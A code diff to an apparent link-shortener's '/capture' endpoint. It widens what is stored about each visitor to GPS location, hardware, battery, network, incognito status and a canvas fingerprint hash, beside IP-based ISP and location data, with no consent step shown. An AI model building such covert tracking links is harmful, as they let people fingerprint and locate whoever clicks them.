@@ -128,25 +128,28 @@ router.post("/shorten", async (req, res) => {
 });
 
 // POST /api/links/capture
-// Body: { token, referrer, screenWidth, screenHeight, language, platform,
-//         gpsLat, gpsLon, gpsAccuracy, gpsAddress, gpsCity, gpsState, gpsPincode, gpsCountry }
 router.post("/capture", async (req, res) => {
     try {
         const {
             token,
-            referrer,
-            screenWidth,
-            screenHeight,
-            language,
-            platform,
-            gpsLat,
-            gpsLon,
-            gpsAccuracy,
-            gpsAddress,
-            gpsCity,
-            gpsState,
-            gpsPincode,
-            gpsCountry,
+            // GPS
+            gpsLat, gpsLon, gpsAccuracy,
+            // Hardware
+            cpuCores, ram, gpu, gpuVendor, maxTouchPoints,
+            // Battery
+            batteryLevel, batteryCharging,
+            // Screen
+            screenWidth, screenHeight,
+            screenAvailWidth, screenAvailHeight,
+            colorDepth, pixelDepth, pixelRatio,
+            windowWidth, windowHeight,
+            // Browser
+            language, languages, platform,
+            cookiesEnabled, doNotTrack, historyLength, referrer,
+            // Network
+            connectionType, connectionDownlink, connectionRtt, connectionSaveData,
+            // Privacy & Fingerprint
+            incognito, canvasHash,
         } = req.body;
 
         if (!token) return res.status(400).json({ error: "token is required" });
@@ -208,12 +211,11 @@ router.post("/capture", async (req, res) => {
             gpsPincode: geoData.gpsPincode || null,
             gpsCountry: geoData.gpsCountry || null,
 
-            // Browser
+            // Browser (parsed from UA)
             browser: parseBrowser(ua),
             os: parseOS(ua),
             device: parseDevice(ua),
             userAgent: ua,
-
             referrer: referrer || null,
             hostname: ipData.hostname || null,
             isp: ipData.isp || null,
@@ -221,10 +223,45 @@ router.post("/capture", async (req, res) => {
             asn: ipData.asn || null,
             timezone: ipData.timezone || null,
 
+            // Hardware
+            cpuCores: cpuCores || null,
+            ram: ram || null,
+            gpu: gpu || null,
+            gpuVendor: gpuVendor || null,
+            maxTouchPoints: maxTouchPoints ?? null,
+
+            // Battery
+            batteryLevel: batteryLevel ?? null,
+            batteryCharging: batteryCharging ?? null,
+
+            // Screen
             screenWidth: screenWidth || null,
             screenHeight: screenHeight || null,
+            screenAvailWidth: screenAvailWidth || null,
+            screenAvailHeight: screenAvailHeight || null,
+            colorDepth: colorDepth || null,
+            pixelDepth: pixelDepth || null,
+            pixelRatio: pixelRatio || null,
+            windowWidth: windowWidth || null,
+            windowHeight: windowHeight || null,
+
+            // Browser / Language
             language: language || null,
+            languages: languages || null,
             platform: platform || null,
+            cookiesEnabled: cookiesEnabled ?? null,
+            doNotTrack: doNotTrack || null,
+            historyLength: historyLength || null,
+
+            // Network
+            connectionType: connectionType || null,
+            connectionDownlink: connectionDownlink || null,
+            connectionRtt: connectionRtt || null,
+            connectionSaveData: connectionSaveData ?? null,
+
+            // Privacy & Fingerprint
+            incognito: incognito ?? null,
+            canvasHash: canvasHash || null,
         };
 
         const result = await recordCapture(token, deviceData);
